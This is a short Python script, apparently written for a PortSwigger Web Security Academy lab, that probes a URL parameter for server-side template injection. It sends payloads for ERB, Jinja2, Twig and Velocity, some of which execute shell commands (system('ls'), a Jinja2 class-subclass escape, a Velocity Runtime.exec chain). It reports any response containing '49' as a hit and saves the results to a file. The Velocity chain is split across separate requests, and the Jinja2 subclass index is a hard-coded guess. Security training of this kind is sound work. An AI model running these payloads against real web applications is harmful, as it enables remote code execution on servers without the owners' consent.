import requests
from urllib.parse import quote

# List of common SSTI payloads for different template engines
payloads = {
    "erb": ["<%= 7*7 %>", "<%= system('ls') %>"],
    "jinja2": ["{{ 7*7 }}", "{{ ''.__class__.__mro__[1].__subclasses__()[59]('ls').read() }}"],
    "twig": ["{{ 7*7 }}", "{{ system('ls') }}"],
    "velocity": ["#set($x = 7 * 7)", "$x", "#set($x = 7 * 7) $x", "#set($cmd = 'ls')", "#foreach($i in [1])", "$i.getClass().forName('java.lang.Runtime').getRuntime().exec($cmd)", "#end"]
}

# Function to check SSTI vulnerability
def check_ssti(url, param='message'):
    details = []
    for engine, tests in payloads.items():
        for payload in tests:
            encoded_payload = quote(payload)
            test_url = f"{url}?{param}={encoded_payload}"

            try:
                response = requests.get(test_url)
                if response.status_code == 200 and "49" in response.text:
                    details.append((engine, payload, f"SSTI vulnerability detected with {engine} payload: {payload}"))
                    print(f"[+] SSTI vulnerability detected with {engine} payload: {payload}")
            except requests.RequestException as e:
                print(f"[-] An error occurred: {e}")
    
    # Save the details to a file
    with open("ssti_results.txt", "w") as file:
        for engine, payload, detail in details:
            file.write(f"{detail}\n")

    return details

if __name__ == "__main__":
    target_url = "https://0ad000ff03bb7b3881faae1f008c0025.web-security-academy.net/"
    param = "message"

    details = check_ssti(target_url, param)
    if details:
        print("Vulnerabilities found:")
        for engine, payload, detail in details:
            print(detail)
    else:
        print("No SSTI vulnerabilities detected.")
